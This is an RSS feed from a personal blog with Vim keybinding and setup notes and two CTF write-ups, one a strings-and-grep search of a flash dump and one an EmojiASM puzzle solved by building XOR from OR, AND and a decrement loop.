<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Jacob Shin</title>
        <link>/posts/</link>
        <description>Recent content in Posts on Jacob Shin</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>Jacob Shin</copyright>
        <lastBuildDate>Fri, 27 Nov 2020 16:40:12 -0500</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Notes: College Computer Science</title>
            <link>/posts/college/</link>
            <pubDate>Fri, 27 Nov 2020 00:00:00 +0000</pubDate>
            
            <guid>/posts/college/</guid>
            <description>Notes from classes written in $ \LaTeX $ alongside Markdown using MathJax:</description>
            <content type="html"><![CDATA[<p>Notes from classes written in $ \LaTeX $ alongside Markdown using MathJax:</p>
<!-- [Discrete Mathematics I Notes (CIS 1966)](/posts/discrete-maths-1) -->
]]></content>
        </item>
        
        <item>
            <title>Notes: Vim Notes from the Primeagen</title>
            <link>/posts/vimnotes/</link>
            <pubDate>Mon, 06 Jul 2020 00:00:00 +0000</pubDate>
            
            <guid>/posts/vimnotes/</guid>
            <description>The Primeagen
Notes written in (neo)vim
Vim Movements P1 - Your First Moves https://www.youtube.com/watch?v=nnhqVDIx-go
Don&amp;rsquo;t use your arrow keys!
j, k,h, l: down, up, left, right
w, b: jump forward by word, jump backwards by word
f, t: jump to a letter, jump one before a letter
%: Go to respective parenthesis, brace, etc.
Ctrl-d, Ctrl-u: jump down half page, jump up half page
{, }: jump up a block, jump down by a block</description>
            <content type="html"><![CDATA[<p><a href="https://www.youtube.com/playlist?list=PLm323Lc7iSW9kRCuzB3J_h7vPjIDedplM">The Primeagen</a></p>
<p>Notes written in (neo)vim</p>
<h2 id="vim-movements-p1---your-first-moves">Vim Movements P1 - Your First Moves</h2>
<p><a href="https://www.youtube.com/watch?v=nnhqVDIx-go">https://www.youtube.com/watch?v=nnhqVDIx-go</a></p>
<p>Don&rsquo;t use your arrow keys!</p>
<p><code>j</code>, <code>k</code>,<code>h</code>, <code>l</code>: down, up, left, right</p>
<p><code>w</code>, <code>b</code>: jump forward by word, jump backwards by word</p>
<p><code>f</code>, <code>t</code>: jump to a letter, jump one before a letter</p>
<p><code>%</code>: Go to respective parenthesis, brace, etc.</p>
<p><code>Ctrl-d</code>, <code>Ctrl-u</code>: jump down half page, jump up half page</p>
<p><code>{</code>, <code>}</code>: jump up a block, jump down by a block</p>
<p><code>V</code>: highlight line and enter visual mode</p>
<p><code>P</code>, <code>p</code>: paste up a line, paste down a line</p>
<p><code>U</code>: Capitalize stuff that&rsquo;s highlighted</p>
<p><code>Ctrl-a</code>, <code>ctrl-x</code>: Increment var, decrement var</p>
<p><code>o</code>, <code>O</code>: Insert newline below current, insert newline above current line (both enter insert mode)</p>
<p><code>I</code>, <code>A</code>: Enter insert mode at first character on a line, enter insert mode at last character in the current line</p>
<h2 id="your-first-vimrc-how-to-setup-your-vims-vimrc">Your first VimRC: How to setup your vim&rsquo;s vimrc</h2>
<p><a href="https://www.youtube.com/watch?v=n9k9scbTuvQ">https://www.youtube.com/watch?v=n9k9scbTuvQ</a></p>
<p>Source or &ldquo;execute&rdquo; everything in a file with <code>source %</code>.<br>
This applies changes made to .vimrc.</p>
<p>Make sure to create the undodir at <code>~/.vim/undodir</code></p>
<p>Run the following command to install the plug vim plugin manager</p>
<pre><code class="language-console" data-lang="console">curl -fLo ~/.vim/autoload/plug.vim --create-dirs \
    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
</code></pre><p>Open up the .vimrc and add in your plugins.
Then source the .vim with <code>:source %s</code>.
Then install plugins with <code>:PlugInstall</code>.</p>
<p>Make YCM work:</p>
<pre><code class="language-console" data-lang="console">$ cd ~/.vim/plugged/YouCompleteMe
$ python3 install.py
</code></pre><p>Add some nice remap to make things easier:</p>
<ul>
<li>
<p><code>&lt;leader&gt;h</code>: Move to window on the left</p>
</li>
<li>
<p><code>&lt;leader&gt;l</code>: Move to window on the right</p>
</li>
<li>
<p><code>&lt;leader&gt;j</code>: Move to window on the bottom</p>
</li>
<li>
<p><code>&lt;leader&gt;k</code>: Move to window on the top</p>
</li>
<li>
<p><code>&lt;leader&gt;u</code>: Show undo tree</p>
</li>
<li>
<p><code>&lt;leader&gt;pv</code>: Open up file tree</p>
</li>
<li>
<p><code>&lt;leader&gt;ps</code>: (Project Search) searches for stuff using ripgrep (Make sure to install ripgrep on your system)</p>
</li>
<li>
<p><code>&lt;leader&gt;gd</code>: Go to definition</p>
</li>
<li>
<p><code>&lt;leader&gt;gr</code>: Go to references</p>
</li>
</ul>
<h2 id="vim-movements-p2-5-moves-to-make-you-better-ked">VIM Movements P2: 5 moves to make you better ked</h2>
<p><a href="https://www.youtube.com/watch?v=QN4fuSsWTbA">https://www.youtube.com/watch?v=QN4fuSsWTbA</a></p>
<ul>
<li>
<p>Use Ctrl-c or Ctrl-open bracket instead of Esc.<br>
Instead of using the CAPS LOCK key for Esc, you can use it for CTRL.</p>
</li>
<li>
<p>When using f and t, you can use <code>,</code> to go backwards and <code>;</code> to go forwards to search for the same letter without repeating the same command</p>
</li>
<li>
<p>Use <code>c</code> instead of <code>d</code> to enter insert mode</p>
</li>
<li>
<p>You can use <code>i</code> and <code>a</code> in conjunction with c or d to remove whatever&rsquo;s inside {}, [], &ldquo;&quot;, &lsquo;', etc.
E.g. ci&rdquo; will delete everything within the following string: &ldquo;Hello, world&rdquo;.
ca&rdquo; will delete everything inside the string as well as the &ldquo;&quot;.</p>
</li>
<li>
<p>Marks allow jumping to points in a file: <code>mJ</code> will create a mark called J. <code>'J</code> will jump to the mark. Note: Capital letter are marks that are unique across multiple files while lowercase letters are for local file marks.</p>
</li>
<li>
<p>Bonus remap allows you to move highlighted regions up or down:</p>
</li>
</ul>
<pre><code class="language-{.vimscript}" data-lang="{.vimscript}">vnoremap J :m '&gt;+1&lt;CR&gt;gv=gv
vnoremap K :m '&lt;-2&lt;CR&gt;gv=gv
</code></pre><h2 id="using-vim-vim--git---fugitive">Using Vim: Vim + Git - Fugitive</h2>
<p><a href="https://www.youtube.com/watch?v=PO6DxfGPQvw">https://www.youtube.com/watch?v=PO6DxfGPQvw</a></p>
<p><code>&lt;leader&gt;gs</code>: Git Status</p>
<p>Use <code>s</code> to stage and <code>u</code> to unstage.</p>
<p><code>:Gcommit</code>: Commits stuff</p>
<p><code>:Gpush</code>: Pushes stuff</p>
<p><code>:Git merge &lt;branchname&gt;</code>: Merge</p>
<p>Use <code>dv</code> on the file you want to resolve if you have merge conflicts.<br>
The window on the left should be the current branch, the window on the right should be the one you just merged from, and the middle window is the resulting merge.</p>
<p><code>&lt;leader&gt;gf</code>: Grab from the window on the left (Use &lsquo;gu&rsquo; if using dvorak)</p>
<p><code>&lt;leader&gt;gj</code>: Grab from the window on the right (Use &lsquo;gh&rsquo; if using dvorak)</p>
<p><code>Ctrl-w</code> and <code>ctrl-O</code>: save and close</p>
<h2 id="making-vim-amazing---why-use-vim-and-the-vimrc">Making Vim Amazing - Why use Vim and the .vimrc</h2>
<p><a href="https://www.youtube.com/watch?v=Iid1Ms14Om4">https://www.youtube.com/watch?v=Iid1Ms14Om4</a></p>
<p>Why Vim?</p>
<ul>
<li>Fast: Doesn&rsquo;t take forever to load files</li>
<li>Autocomplete</li>
<li>Able to jump to definitions fast</li>
</ul>
<h2 id="vimium-intro-to-using-keyboard-in-your-browser">Vimium: Intro to using keyboard in your browser</h2>
<p><a href="https://www.youtube.com/watch?v=cA2aUFsSLac">https://www.youtube.com/watch?v=cA2aUFsSLac</a></p>
<p><code>j</code> and <code>k</code>: down and up</p>
<p><code>d</code>, <code>u</code>: half-page down, half-page up (you don&rsquo;t need ctrl)</p>
<p><code>f</code>: open link in current tab</p>
<p><code>H</code>: go back</p>
<p><code>V</code>: Visual mode highlight entire line</p>
<p><code>y</code>: yank</p>
<h2 id="using-vim-my-vim-workflow---solving-a-bug">Using Vim: My Vim Workflow - Solving a bug</h2>
<p><a href="https://www.youtube.com/watch?v=-I1b8BINyEw">https://www.youtube.com/watch?v=-I1b8BINyEw</a></p>
<h3 id="first-you-want-some-plugins">First you want some plugins</h3>
<ul>
<li>Gruvbox: &ldquo;The greatest colorscheme ever bestowed to mankind&rdquo;</li>
<li>COC: For autocomplete</li>
<li>Fzf: File finding</li>
</ul>
<p>Colorscheme:</p>
<pre><code>colorscheme gruvbox
</code></pre><p>Nice remaps for coc and jumping to definition/references:</p>
<pre><code>nmap &lt;leader&gt;gd &lt;Plug&gt;(coc-definition)
nmap &lt;leader&gt;gr &lt;Plug&gt;(coc-references)
</code></pre><p>Fzf remap to make searching for files easier:</p>
<pre><code>nnoremap &lt;C-p&gt; :GFiles&lt;CR&gt; 
</code></pre><h3 id="commands-used">Commands Used</h3>
<p><code>Ctrl-p</code>: Remap for :GFiles. Use it to search for a file. Works even for searching large codebases.</p>
<p><code>&lt;leader&gt;gd</code>: Jump to definition</p>
<p><code>Ctrl-^</code>: Jumps to the last file you were in</p>
<p><code>Ctrl-o</code>: Go back to last position</p>
<p><code>Ctrl-i</code>: Go forward position (Opposite of Ctrl-o)</p>
<h2 id="vim-coolest-vim-command">VIM: Coolest Vim Command</h2>
<p><a href="https://www.youtube.com/watch?v=E7NBhSsZouc">https://www.youtube.com/watch?v=E7NBhSsZouc</a></p>
<p>Let&rsquo;s say you have a line of code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://localhost:8002&#34;</span>, {
</code></pre></div><p>If you wanted to change the <code>http://localhost:8002</code> string inside the quotes,
you don&rsquo;t have to use <code>f&quot;</code> to go to the quotes, you can just use <code>ci&quot;</code>. Vim automatically jumps to the nearest quote.</p>
<h2 id="vim-g-command">Vim &ldquo;g&rdquo; Command</h2>
<p><a href="https://www.youtube.com/watch?v=CN8p9iL7PPI">https://www.youtube.com/watch?v=CN8p9iL7PPI</a></p>
<p><code>g Ctrl-g</code>: Shows you what line, column, word, and byte you&rsquo;re at and how far you&rsquo;re down the file</p>
<p><code>g8</code>: Get ASCII Code of current character</p>
<p><code>g&lt;</code>: Get the output from the last command you executed</p>
<p><code>g&amp;</code>: Replay your last s command (substitution)</p>
<p><code>gJ</code>: Combines the line below with the current line while keeping the spacing the same</p>
<p><code>gU motion</code>: Uppercase stuff</p>
<p><code>gu motion</code>: Lowercase stuff</p>
<p><code>gd</code>: Jump to definition in the file (or function?)</p>
<p><code>gf</code>: Jumps to a file</p>
<p><code>gF</code>: Jump to a line in a file</p>
<p><code>gq</code>: Automatically align text to 80 characters</p>
<p><code>gQ</code>: Enter Ex mode</p>
<p><code>8g_</code>: Jumps down <em>7</em> lines and puts you at the end of that line</p>
<p><code>g\$</code>: In wrap mode go to the end of the &ldquo;line&rdquo;</p>
<p><code>g??</code>: Rot13 on a line</p>
<p><code>gg</code>: To Top</p>
<p><code>G</code>: Bottom</p>
<p><code>gv</code>: Rehighlight what you previously highlighted</p>
<p><code>gi</code>: Go back to your previous insert spot</p>
<p><code>'&lt;,'&gt;g/Styled/d</code>: Delete all lines with &ldquo;Styled&rdquo;</p>
<p><code>'&lt;,'&gt;g/Styled/norm! diw</code>: Execute diw on every line with &ldquo;Styled&rdquo;</p>
<p><code>:help g</code>: A bunch more g commands</p>
<p><code>help :g</code>: All the fun searching g commands</p>
]]></content>
        </item>
        
        <item>
            <title>CTF Writeup: Solved in a Flash</title>
            <link>/posts/ractf-solved-in-a-flash/</link>
            <pubDate>Mon, 15 Jun 2020 21:06:36 -0400</pubDate>
            
            <guid>/posts/ractf-solved-in-a-flash/</guid>
            <description>Use strings to look for strings in the flash.bin file. Use grep to look for strings with &amp;ldquo;ractf&amp;rdquo; in it.
$ strings flash.bin | grep ractf ractf{Fl4shDump5Ar3VeryFun!!} </description>
            <content type="html"><![CDATA[<p>Use strings to look for strings in the flash.bin file. Use grep to look for strings with &ldquo;ractf&rdquo; in it.</p>
<pre><code class="language-console" data-lang="console">$ strings flash.bin | grep ractf
ractf{Fl4shDump5Ar3VeryFun!!}
</code></pre>]]></content>
        </item>
        
        <item>
            <title>CTF Writeup: Return of the EmojASM</title>
            <link>/posts/ractf-return-of-the-emojiasm/</link>
            <pubDate>Mon, 15 Jun 2020 21:01:15 -0400</pubDate>
            
            <guid>/posts/ractf-return-of-the-emojiasm/</guid>
            <description>It looks like we have another EmojiASM problem! Note: Depending on what editor/browser you view this on, the emoji&amp;rsquo;s might not be shown properly. That means copying and pasting the emojis might not work well. Try using a browser.
Problem Description Impressive work. But the emojasm gods have provided you with one more foul challenge. Once again, the web interface should be above.
Info from the EmojiASM Webpage Architecture  General-purpose registers X and Y (both 8 bits wide) Accumulator Register A (8 bits wide) 3x Tape Drives, T0 T1 and T2 (descibed below), each with the following:  1 input buffer register (TnI) 1 ouput buffer register (TnO) 1 write flag (TnW)   Obviously each tape drive has a position on the tape as well, which changes as the tape gets moved.</description>
            <content type="html"><![CDATA[<p>It looks like we have another EmojiASM problem!
Note: Depending on what editor/browser you view this on, the emoji&rsquo;s might not be shown properly. That means copying and pasting the emojis might not work well. Try using a browser.</p>
<h2 id="problem-description">Problem Description</h2>
<p>Impressive work. But the emojasm gods have provided you with one more foul challenge. Once again, the web interface should be above.</p>
<h2 id="info-from-the-emojiasm-webpage">Info from the EmojiASM Webpage</h2>
<h3 id="architecture">Architecture</h3>
<ul>
<li>General-purpose registers X and Y (both 8 bits wide)</li>
<li>Accumulator Register A (8 bits wide)</li>
<li>3x Tape Drives, T0 T1 and T2 (descibed below), each with the following:
<ul>
<li>1 input buffer register (TnI)</li>
<li>1 ouput buffer register (TnO)</li>
<li>1 write flag (TnW)</li>
</ul>
</li>
<li>Obviously each tape drive has a position on the tape as well, which changes as the tape gets moved. (TnP)</li>
</ul>
<p>&ldquo;n&rdquo; here refers to the tape id, so for instance the input buffer register of tape 2 (T2) is known as T2I.</p>
<h3 id="tape-drive-details">Tape drive details</h3>
<p>Each tape drive supports the following operations:</p>
<ul>
<li>Forward - move the tape forward one space (and other things, described below)</li>
<li>Backward - move the tape backward one space</li>
<li>Rewind - reset the tape&rsquo;s position to 0, and clear both buffers and the write flag.</li>
<li>Set-write - write a byte to the output buffer and set the write flag.</li>
</ul>
<p>The forward operation is special because it also does the following:</p>
<ul>
<li>Reads the data in the space it has just passed over into the input buffer register</li>
<li>If the write flag is set:
<ul>
<li>Write the data in the output buffer register to the byte just passed over</li>
<li>Clear the write flag</li>
</ul>
</li>
</ul>
<p>None of those things happen when going backwards, and this is the only way to read and write to or from any tape.</p>
<p>Each tape drive is 256 bytes long. Trying to move forwards or backwards past the end of the tape has no effect.</p>
<p>Read more about EmojiASM <a href="https://gist.github.com/Bentechy66/bce063ee26bb0ec2ae664d506ed28ad0#file-emojasm_16bitjmp_spec-md">here</a>.</p>
<h2 id="approach">Approach</h2>
<p>Basically we just have to xor each byte from tape0 with a byte from tape1.
Unfortunately we EmojiASM doesn&rsquo;t have an xor instruction. All the bitwise operations we have are <code>&amp;</code> and <code>|</code>.</p>
<p>Fortunately, we can use a combination of the given operations to create something that&rsquo;s equivalent to the xor operation.
After some searching, I come across this stack overflow <a href="https://stackoverflow.com/questions/4715232/xor-from-only-or-and-and">post</a>.</p>
<p>After scrolling through the various answers, it seems like <a href="https://stackoverflow.com/a/47588032/9512643">this</a> is the easiest to implement in emojiasm.
We&rsquo;ll use this to replace xor</p>
<pre><code>a ^ b  = (a | b) - (a &amp; b)
</code></pre><h2 id="read-data-off-of-tape0-and-tape1">Read data off of Tape0 and Tape1</h2>
<p>We&rsquo;ll be using the practice mode first to make sure our asm actually works (make sure to check the &ldquo;Include debug output&rdquo; option).
First, let&rsquo;s see if we can read some of the data on tape0 and tape1.</p>
<p>Let&rsquo;s read from T1 first:</p>
<pre><code>➡️🎞️             Move T1 forward        puts one character into T1I
👁️🎞️            A &lt;- T1I               move the character in T1I into the Accumulator Register A
📤              output &lt;- chr(A)       print out what's in A
</code></pre><p>We can put all the instructions in a compact line like this <code>➡️🎞️👁️🎞️📤</code>.
Let&rsquo;s see what&rsquo;s on T1 by stringing a bunch of these together:</p>
<pre><code>➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤
</code></pre><p>We get the following output</p>
<pre><code>Your program has been run successfully!

The output was:

xorkeyxork
</code></pre><p>Let&rsquo;s try doing the same for T0:</p>
<pre><code>➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤
</code></pre><p>Output:</p>
<pre><code>Your program has been run successfully!

The output was:

⏽⏽⏽⏽⏽
⏽
</code></pre><p>It looks like Tape0 has non ASCII characters. Let&rsquo;s add 0x30 to each character from tape0 to make them viewable.
For example, if tape0 had <code>0</code> in the first byte, we would add 0x30 before displaying it. <code>chr(0 + 0x30) = &quot;0&quot;</code>. Then we would see <code>&quot;0&quot;</code> instead of <code>⏽</code>.</p>
<pre><code>➡️📼             Move T0 forward         Puts one byte into T0I
👁️📼            A &lt;- T0I                Move the byte in T0I into the Accumulator Register A
📦🔨            X &lt;- A                  Put what's in A into X 
✉️😃😀           A &lt;- 0x30               Puts 0x30 into A
➕🔨            A &lt;- A + X              Adds X to A
📤              out &lt;- chr(A)           Outputs A
</code></pre><p>The pseudocode below is equivalenet to the above</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">A <span style="color:#f92672">=</span> T0I <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>
print(A)
</code></pre></div><p>Make the above emojiasm more compact: <code>➡️📼👁️📼📦🔨✉️😃😀➕🔨📤</code>
And string a bunch together to read tape1:</p>
<pre><code>➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤
</code></pre><p>Output:</p>
<pre><code>Your program has been run successfully!

The output was:

:&gt;AO32&lt;:1O

</code></pre><p>So the first byte on tape0 is 10 since <code>ord(&quot;:&quot;) - 0x30 = 10</code></p>
<p>Let&rsquo;s see what the first character of the flag should be by xoring the first byte from tape0 (10) with the first byte from tape1 (ord(&ldquo;x&rdquo;)):</p>
<pre><code class="language-console" data-lang="console">$ python -c 'print chr(10 ^ ord(&quot;x&quot;))'
r
</code></pre><p>As we expected, the first character of the flag is <code>r</code>.</p>
<h2 id="implement-subtraction">Implement Subtraction</h2>
<p>Now we can use <code>a ^ b  = (a | b) - (a &amp; b)</code> to implement an xor function. However, emojiasm doesn&rsquo;t have a subtract operation, only a decrement op.<br>
So we have to first create a way to subtract before we make implement xor.</p>
<p>The following code subtracts 0x02 from 0x43 and stores the result in T2:</p>
<pre><code>01: ✉️😄😃               A &lt;- 0x43 
02: ✏️🎥                 T2O &lt;- A
03: ➡️🎥                 T2 &lt;- T2O
04: T2[0] = 0x43
05:
06: ✉️😀😂               A &lt;- 0x02
07: 📦🔨                X &lt;- A
08: X = 0x2
09: 
10: ✉️😀😀               A &lt;- 0
11: 📦⛏️                 Y &lt;- A
12: Y = 0
13: 
14: ⏪🎥                Rewind T2
15: ➡️🎥👁️🎥             A &lt;- T2               
16: 🦔🗃️                A &lt;- A - 1
17: ⏪🎥                Rewind T2
18: ✏️🎥                 T2O &lt;- A
19: ➡️🎥                 T2 &lt;- T2O
20: A = T2[0]
21: A -= 1
22: T2[0] = A
23: 
24: 💡⛏️                 Y &lt;- Y + 1
25: 🎁⛏️                 A &lt;- Y
26: ❓🔨                flags ← cmp(X, A)
27: 🐇😀😀😁😅          RJMP &lt;- value
28: 🏷️                  {if flags.EQ not set} PC ← RJMP
29: Y += 1
30: if y != A:
31:     goto 14
</code></pre><p>An uncommented version of the above:</p>
<pre><code>✉️😄😃
✏️🎥
➡️🎥
✉️😀😂
📦🔨
⏪🎥
➡️🎥👁️🎥
🦔🗃️
⏪🎥
✏️🎥
➡️🎥
💡⛏️
🎁⛏️
❓🔨
🐇😀😀😁😅
🏷️
</code></pre><p>Let&rsquo;s run the above asm:</p>
<pre><code>Your program has been run successfully!

The output was:


--Debug output

1-4: OP.LDA with args: ['😄', '😃']
6-8: OP.TOUT with args: 🎥
10-12: OP.TF with args: 🎥
14-17: OP.LDA with args: ['�', '😂']
18-20: OP.TAR with args: 🔨
21-23: OP.TRW with args: 🎥
25-27: OP.TF with args: 🎥
28-30: OP.TIN with args: 🎥
31-34: OP.DEC with args: 🗃️
35-37: OP.TRW with args: 🎥
39-41: OP.TOUT with args: 🎥
43-45: OP.TF with args: 🎥
46-49: OP.INC with args: ⛏️
50-53: OP.TRA with args: ⛏️
54-56: OP.CMP with args: 🔨
57-62: OP.LDJMP with args: ['�', '�', '😁', '😅']
[OP.LDJMP] - Setting RJMP to 21 for ldjmp [0x0, 0x0, 0x1, 0x5]
64-65: OP.JMPNEQ with args: None
[OP.JMPNEQ] - Setting PC to 21
21-23: OP.TRW with args: 🎥
25-27: OP.TF with args: 🎥
28-30: OP.TIN with args: 🎥
31-34: OP.DEC with args: 🗃️
35-37: OP.TRW with args: 🎥
39-41: OP.TOUT with args: 🎥
43-45: OP.TF with args: 🎥
46-49: OP.INC with args: ⛏️
50-53: OP.TRA with args: ⛏️
54-56: OP.CMP with args: 🔨
57-62: OP.LDJMP with args: ['�', '�', '😁', '😅']
[OP.LDJMP] - Setting RJMP to 21 for ldjmp [0x0, 0x0, 0x1, 0x5]
64-65: OP.JMPNEQ with args: None
Halting (pc: 65, maxidx: 64)
</code></pre><blockquote>
<p>Jumping:
Program memory offsets are the number of characters (unicode codepoints) from the start of the file. This takes into account emojis that are actually multiple codepoints, so beware.</p>
</blockquote>
<p>If you have any problems or errors running the above code, make sure to remove any extraneous spaces. Any extra character will throw the jump offset off (see the above quote). Here we set the jump to 21 since the first OP.TRW (rewind) instruction is at 21.
If you have extra spaces or extra characters, you might need to adjust the offset to whereever the first rewind instruction is.</p>
<pre><code>⏪🎥                Rewind tape2
➡️🎥👁️🎥             A &lt;- one chr of tape2
📤                  out &lt;- chr(A)
</code></pre><p>The full subtraction code with output:</p>
<pre><code>✉️😄😃
✏️🎥
➡️🎥
✉️😀😂
📦🔨
⏪🎥
➡️🎥👁️🎥
🦔🗃️
⏪🎥
✏️🎥
➡️🎥
💡⛏️
🎁⛏️
❓🔨
🐇😀😀😁😅
🏷️
⏪🎥
➡️🎥👁️🎥  
📤
</code></pre><p>Output:</p>
<pre><code>Your program has been run successfully!
The output was:
A
</code></pre><p>The program prints out <code>A</code>, which is the expected result since 0x43 - 2 = 0x41 and chr(0x41) = &ldquo;A&rdquo;.</p>
<h2 id="implement-xor">Implement XOR</h2>
<p>Now that our test subtraction program works, we use it to implement xor.
We&rsquo;ll basically use the following forumla and imlement that: a ^ b  = (a | b) - (a &amp; b)
Note: In the pseudocode below, <code>i</code> is just the current index or current position on the tape
When the program first starts, the i = 0, since the program starts at the beginning of each tape.
Everytime we read, i is incremented since the position on the tape is also incremented.</p>
<pre><code>01: ➡️📼👁️📼                     A &lt;- one chr of tape0
02: 📦🔨                        X &lt;- A
03: ➡️🎞️👁️🎞️                     A &lt;- one chr of tape1
04: 🎷🔨                        A &lt;- A | X
05: ⏪🎥                        Rewind Tape2
06: ✏️🎥                         T2O &lt;- A
07: ➡️🎥                         T2 &lt;- T2O (output buf of T2)
08: T2[0] = tape1[i] | tape0[i]
09: 
10: ⬅️📼⬅️🎞️                      Move T1 and T0 backwards by 1 since reading from the tapes moves the position forward
11: ➡️📼👁️📼                     A &lt;- one chr of tape0
12: 📦🔨                        X &lt;- A
13: ➡️🎞️👁️🎞️                     A &lt;- one chr of tape1
14: 🍴🔨                        A &lt;- A &amp; X
15: 📦🔨                        X &lt;- A
16: ✉️😀😀                       A &lt;- 0
17: 📦⛏️                         Y &lt;- A
18: X = T1[i] &amp; T0[i]
20: Y = 0
21: 
22: ⏪🎥                        Rewind T2
23: ➡️🎥👁️🎥                     A &lt;- T2               
24: 🦔🗃️                        A &lt;- A - 1
25: ⏪🎥                        Rewind T2
26: ✏️🎥                         T2O &lt;- A
27: ➡️🎥                         T2 &lt;- T2O
28: A = T2[0]
29: T2[0] = A - 1
30: 
31: 💡⛏️                         Y &lt;- Y + 1
32: 🎁⛏️                         A &lt;- Y
33: ❓🔨                        flags ← cmp(X, A)
34: 🐇😀😀                  RJMP &lt;- value
35: 🏷️                          {if flags.EQ not set} PC ← RJMP
36: Y += 1
37: if X != Y:
38:     goto 22
</code></pre><p>Uncommented version of above:</p>
<pre><code>➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🎷🔨
⏪🎥
✏️🎥
➡️🎥
⬅️📼⬅️🎞️
➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🍴🔨
📦🔨
✉️😀😀
📦⛏️
⏪🎥
➡️🎥👁️🎥
🦔🗃️
⏪🎥
✏️🎥
➡️🎥
💡⛏️
🎁⛏️
❓🔨
🐇😀😀😄😋
🏷️
</code></pre><p>Just like in the subtraction program, we set the jump offset to where the first rewind instruction is (OP.TRW) which in this case is 75 or 0x4b.</p>
<p>Now let&rsquo;s make sure the program is actually working by printing out the first byte in T2. We&rsquo;ll use this code snippet from earlier to print out the first byte of T2:</p>
<pre><code>⏪🎥
➡️🎥👁️🎥  
📤
</code></pre><p>Now combine the output code with the xor implementation:</p>
<pre><code>➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🎷🔨
⏪🎥
✏️🎥
➡️🎥
⬅️📼⬅️🎞️
➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🍴🔨
📦🔨
✉️😀😀
📦⛏️
⏪🎥
➡️🎥👁️🎥
🦔🗃️
⏪🎥
✏️🎥
➡️🎥
💡⛏️
🎁⛏️
❓🔨
🐇😀😀😄😋
🏷️
⏪🎥
➡️🎥👁️🎥  
📤
</code></pre><p>Ouput</p>
<pre><code>Your program has been run successfully!

The output was:

r
</code></pre><p>We&rsquo;ve got the first letter of the flag!
Now all we have to do is copy and paste the above code snippet about 4 times:</p>
<pre><code>➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🎷🔨
⏪🎥
✏️🎥
➡️🎥
⬅️📼⬅️🎞️
➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🍴🔨
📦🔨
✉️😀😀
📦⛏️
⏪🎥
➡️🎥👁️🎥
🦔🗃️
⏪🎥
✏️🎥
➡️🎥
💡⛏️
🎁⛏️
❓🔨
🐇😀😀😄😋
🏷️
⏪🎥
➡️🎥👁️🎥  
📤

➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🎷🔨
⏪🎥
✏️🎥
➡️🎥
⬅️📼⬅️🎞️
➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🍴🔨
📦🔨
✉️😀😀
📦⛏️
⏪🎥
➡️🎥👁️🎥
🦔🗃️
⏪🎥
✏️🎥
➡️🎥
💡⛏️
🎁⛏️
❓🔨
🐇😀😀😄😋
🏷️
⏪🎥
➡️🎥👁️🎥  
📤

➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🎷🔨
⏪🎥
✏️🎥
➡️🎥
⬅️📼⬅️🎞️
➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🍴🔨
📦🔨
✉️😀😀
📦⛏️
⏪🎥
➡️🎥👁️🎥
🦔🗃️
⏪🎥
✏️🎥
➡️🎥
💡⛏️
🎁⛏️
❓🔨
🐇😀😀😄😋
🏷️
⏪🎥
➡️🎥👁️🎥  
📤

➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🎷🔨
⏪🎥
✏️🎥
➡️🎥
⬅️📼⬅️🎞️
➡️📼👁️📼
📦🔨
➡️🎞️👁️🎞️
🍴🔨
📦🔨
✉️😀😀
📦⛏️
⏪🎥
➡️🎥👁️🎥
🦔🗃️
⏪🎥
✏️🎥
➡️🎥
💡⛏️
🎁⛏️
❓🔨
🐇😀😀😄😋
🏷️
⏪🎥
➡️🎥👁️🎥  
📤
</code></pre><p>Output</p>
<pre><code>Your program has been run successfully!

The output was:

ractf{testing_flag}
The expected output was:

ractf{testingflag}
This was a match.
</code></pre><p>We&rsquo;ve got the whole flag!
